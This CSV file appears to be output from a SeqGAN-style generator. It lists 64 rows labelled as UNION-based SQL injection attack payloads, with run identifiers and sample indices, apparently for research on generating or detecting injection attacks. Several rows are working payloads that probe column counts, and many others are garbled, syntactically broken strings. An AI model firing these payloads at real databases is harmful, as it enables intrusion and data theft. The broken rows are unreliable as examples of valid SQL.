label,payload,family,payload_type,method,run_id,sample_index
attack,"1'   )    )    )    )    )    )    where 7815  =  2774union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,601
attack,"1""   )    )    )    )    )    )    )    where 8890  =  8890 union all select 1494--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,602
attack,"1' union all 6621 8231(  (  (  (    )   --ION --  1494-- union all where 5145  -- from where 6700  (    )   --'   (    )    )    )    -- 2446 v   -- union all select 3741,9347,7230,4273,1646,9988,5087,9110,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,603
attack,"1  )   union all select 8067,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,604
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,605
attack,"1'  )   union all select  1249,9347,8067,8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,606
attack,"1' union all id  (  (  (    )    )    )    --""   )    )    )    )     )   union all null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,607
attack,1'  )   union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,608
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,609
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,610
attack,"1'""   )    )    )    )    )    )    where 2878  =  1494 union all where -- 6441,8067 from select 3900# all where 3900,8890,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,611
attack,"1'   )    )    )    )    )    )    )    where 2878  =  2774 union all select 6386null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,612
attack,1'  )   union all where null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,613
attack,"1""   )    )    )    )    )    )    where  id  =  3741 union all 8099  (  (    )    )    )    -- v'   -- 1839",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,614
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,615
attack,"1' union all select 6621,8067,null,null,9777,8885,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,616
attack,"1' union all select null,null,null,8067,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,617
attack,")   s where 4338  =  )    -- 9110   -- all where 5145 all from where 1917  (    )   -- lwhere where 1917  (    )   -- vS)    )   -- o'  (    )    )    )    )    where null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,618
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,619
attack,"1"" union all select null,5145--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,620
attack,"1'  )   union all select 3820,9346,9110,2887#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,621
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,622
attack,"1'  )   union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,623
attack,"1'  )   union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,624
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,625
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,626
attack,"1   1'   )    )    )    )    )    )    where 5870  =  1494 union all u,1276-- union all where 6621  (    )   -- m       -- union where all null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,627
attack,"1"" union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,628
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,629
attack,"1""   )    )    )    )    )    )    where 1494  =  1646 union all where 5145-- 2774 from 6441,  =  (  (    )    )    --)    )    )    )    --   (    )   -- vlwhere where1917  (       )    )    )    --)       )    )    -- lwhere 1047  (    )   -- mlwhere 5477  (    )   --  (    )    )    )    )    -- v'   -- all where null from u,laojgwhere where 5145  (  (    )   --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,630
attack,"1'   )    )    )    )    )    )    )    union all select 2334,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,631
attack,"1""   )    )    )    )    )    )    where null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,632
attack,"1""   )    )    )    )    )    union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,633
attack,"1'   )    )    )    )    )    )    where 2774  =  2774 union all select null null,null,null,null--,2132,9988,8890,8890    --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,634
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,635
attack,"1'""   )    )    )    )    )    )    where 1494  =  union union all 5145 ,1917,7230,  --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,636
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,637
attack,"1""   )    )    )    )    )    where 1494  =  (  =  1980 union all select null,3900,3900,3900,3900,3900,1646#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,638
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,639
attack,"1"")   union all o 3900,3900,3900,1276,39009346,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,640
attack,"1'  )   union all select null null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,641
attack,"1'  )   union all select ,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,642
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,643
attack,"1'  )   union all select 9517,8890,l,9988,8890#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,644
attack,"1""   )    )    )    )    )    )    )     )   union all select 1839,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,645
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,646
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,647
attack,"1'  )   union all select  8067,8067,8067,5087,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,648
attack,"1' union all select 9921,4273,8979,5349,4273,8885,4273,4273#$"",9777#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,649
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,650
attack,"1'   )    )    )    )    )    )    union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,651
attack,"1' union all select select 3990,6737,2132,9988,v,9945#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,652
attack,1' select * from where 7348a 6349--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,653
attack,"1' union all union where  3900,3900,5087,3900,3900,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,654
attack,1' where 1',union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,655
attack,"1"" where  (    )   -- all where 4338  (  (    )    )    --  (    )    )    )   --  (    )    )    )    )    )   -- null -- 5870  (  (    )   -- all where * from 8979d  =  (    )   -- union 2774 from from where from where from ut where from u,3990,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,656
attack,"1'    )   where  9110  =  (       (    )   --  )    )    )    )    )   -- 1494)    -- from where 1980  (    )   --  (    )    )    )    )    -- v   (    )   --1'   (  )   union where null,null,null,null,5925#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,657
attack," select * from usi    ilang where 8099  =  (       )    )    )    )    )    --  (    )   --)    )    )   -- all where 1047 from uas ililang where where 54775145 where 3900  =  (       (    )   --'   )    )    )   -- lwhere 4338  (       (    )    )    )    --  (    )    )    )    )    -- m-- 1,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,658
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,659
attack,"1' union all select 1276,1276,null,null,null,null,8890,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,660
attack,"1""   )    )    )    )    )    )    where 7815  =  3820     union all select 9517,9110  (  (  (  (  (    )   -- where1839(    )       union where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,661
attack,"1""   )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,662
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,663
attack,"1""   )    )    )    )    )    )    )    union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,664
